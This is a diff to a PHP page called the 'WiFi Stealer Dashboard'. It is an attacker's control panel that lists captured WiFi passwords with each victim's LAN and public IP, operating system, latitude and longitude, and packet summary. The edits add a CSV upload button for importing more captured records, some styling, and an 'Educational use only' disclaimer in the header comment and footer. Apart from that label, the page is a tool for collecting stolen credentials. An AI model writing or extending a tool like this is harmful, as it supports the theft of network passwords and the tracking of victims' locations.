@@ -1,6 +1,6 @@
 <?php
-// WiFi credential logger dashboard (extended)
-// Shows Victim LAN IP, OS, Public IP, LAN extra detail, Latitude, Longitude, Packet summary
+// WiFi Stealer Dashboard (extended + CSV upload button)
+// DISCLAIMER: Educational use only. Use only on systems/networks you are authorized to test.
 
 date_default_timezone_set('Asia/Kolkata');
 
@@ -20,9 +20,6 @@ $logFile = __DIR__ . '/wifi_creds.log';
  *  7: Latitude
  *  8: Longitude
  *  9: Packet summary
- *
- * @param string $line
- * @return array|null
  */
 function parse_capture_line($line)
 {
@@ -47,7 +44,6 @@ function parse_capture_line($line)
     $longitude     = trim($fields[8] ?? '');
     $pktSummary    = trim($fields[9] ?? '');
 
-    // Filter out header/garbage rows
     $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
     if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
         return null;
@@ -88,7 +84,7 @@ function h($v)
 }
 
 /**
- * Simple OS detection from user agent (for viewer info only).
+ * Simple OS detection from user agent (viewer info only).
  */
 function detectOS($userAgent) {
     $ua = strtolower($userAgent);
@@ -165,7 +161,8 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     exit;
 }
 
-// --- 2. CSV IMPORT: backend-only (unchanged, still expects at least 5 fields) ---
+// --- 2. CSV IMPORT: via upload button ---
+$importStatus = null;
 if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
     if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
         $importStatus = 'Error: No file uploaded or upload failed.';
@@ -322,6 +319,7 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
             display: flex;
             flex-wrap: wrap;
             gap: 8px;
+            align-items: center;
         }
         .btn {
             font-size: 12px;
@@ -348,6 +346,15 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
         .btn-sm {
             padding: 4px 8px;
             font-size: 11px;
+        }
+        .upload-form {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .upload-form input[type="file"] {
+            font-size: 11px;
+            max-width: 180px;
         }
         .stats-grid {
             display: grid;
@@ -425,6 +432,16 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
             padding-top: 8px;
             border-top: 1px solid rgba(31,41,55,0.9);
         }
+        .status {
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .status-ok {
+            color: #bbf7d0;
+        }
+        .status-error {
+            color: #fecaca;
+        }
         @media (max-width: 768px) {
             table, thead, tbody, th, td, tr {
                 display: block;
@@ -486,26 +503,44 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
             <div class="viewer-meta">
                 You are viewing from IP <?php echo h($viewerIP); ?> on <?php echo h($viewerOS); ?>
             </div>
+        </div>
         <div class="actions">
-            <a href="?action=export_csv" class="btn">Export to CSV</a>
-            <a href="?view=full" class="btn btn-sm" style="<?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
+            <a href="?action=export_csv" class="btn">Export CSV</a>
+
+            <!-- Upload CSV button -->
+            <form class="upload-form" method="post" enctype="multipart/form-data">
+                <input type="hidden" name="action" value="import_csv">
+                <input type="file" name="csv_file" accept=".csv" required>
+                <button type="submit" class="btn btn-sm">Upload CSV</button>
+            </form>
+
+            <a href="?view=full" class="btn btn-sm"
+               style="<?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
                 Full view
             </a>
-            <a href="?view=compact" class="btn btn-sm" style="<?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
+            <a href="?view=compact" class="btn btn-sm"
+               style="<?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
                 Compact view
             </a>
-            <button type="button" class="btn" id="auto-refresh-toggle" onclick="toggleAutoRefresh(!autoRefresh);">
+            <button type="button" class="btn" id="auto-refresh-toggle"
+                    onclick="toggleAutoRefresh(!autoRefresh);">
                 Auto-refresh: OFF
             </button>
-            <form method="post" onsubmit="return confirm('Delete ALL history? This cannot be undone.');" style="display:inline;">
+            <form method="post"
+                  onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
+                  style="display:inline;">
                 <input type="hidden" name="action" value="clear_all">
-                <button type="submit" class="btn btn-danger">Clear all history</button>
+                <button type="submit" class="btn btn-danger">
+                    Clear all history
+                </button>
             </form>
         </div>
     </div>
 
-    <?php if (isset($importStatus)): ?>
-        <p style="font-size: 0.9em; color: #fecaca; margin: 4px 0;"><?php echo h($importStatus); ?></p>
+    <?php if ($importStatus !== null): ?>
+        <div class="status <?php echo strpos($importStatus, 'Error') === 0 ? 'status-error' : 'status-ok'; ?>">
+            <?php echo h($importStatus); ?>
+        </div>
     <?php endif; ?>
 
     <div class="stats-grid">
@@ -545,7 +580,7 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
                     <th>Victim LAN IP</th>
                     <th>LAN extra</th>
                     <th>Public IP</th>
-                    <th>Location (Lat, Lon)</th>
+                    <th>Location</th>
                     <th>Packet summary</th>
                     <th>OS</th>
                 <?php else: ?>
@@ -557,7 +592,10 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
             <tbody>
             <?php if (empty($captureEntries)): ?>
                 <tr>
-                    <td colspan="13" style="text-align:center; padding:12px; color:#9ca3af;">No captures yet.</td>
+                    <td colspan="<?php echo $viewMode === 'full' ? 13 : 5; ?>"
+                        style="text-align:center; padding:12px; color:#9ca3af;">
+                        No captures yet.
+                    </td>
                 </tr>
             <?php else: ?>
                 <?php foreach ($captureEntries as $entry): ?>
@@ -594,10 +632,13 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
                         <?php endif; ?>
 
                         <td>
-                            <form method="post" style="display:inline;" onsubmit="return confirm('Delete this entry?');">
+                            <form method="post" style="display:inline;"
+                                  onsubmit="return confirm('Delete this entry?');">
                                 <input type="hidden" name="action" value="delete_one">
                                 <input type="hidden" name="idx" value="<?php echo h($entry['log_index']); ?>">
-                                <button type="submit" class="btn btn-sm btn-danger">Delete</button>
+                                <button type="submit" class="btn btn-sm btn-danger">
+                                    Delete
+                                </button>
                             </form>
                         </td>
                     </tr>
@@ -608,7 +649,7 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
     </div>
 
     <div class="footer">
-        © 2026 WiFi Stealer Dashboard - Made By Zypher17
+        © 2026 WiFi Stealer Dashboard – Made By Zypher17 • Educational use only
     </div>
 </div>
 </body>
